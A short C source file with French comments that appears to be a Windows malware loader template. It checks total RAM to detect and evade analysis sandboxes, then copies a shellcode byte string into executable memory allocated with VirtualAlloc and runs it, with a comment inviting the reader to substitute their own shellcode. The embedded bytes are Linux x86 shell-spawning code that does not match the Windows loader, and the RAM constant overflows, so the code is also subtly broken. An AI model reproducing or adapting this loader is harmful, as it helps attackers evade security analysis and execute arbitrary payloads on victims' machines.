#include <windows.h>
#include <stdio.h>

int main() {
    // Détection de sandbox : vérification de la mémoire disponible
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    if (memStatus.ullTotalPhys < 2 * 1024 * 1024 * 1024) { // Moins de 2 Go de RAM
        printf("Sandbox detected!\n");
        return 1;
    }

    // Votre shellcode ici
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();

    return 0;
}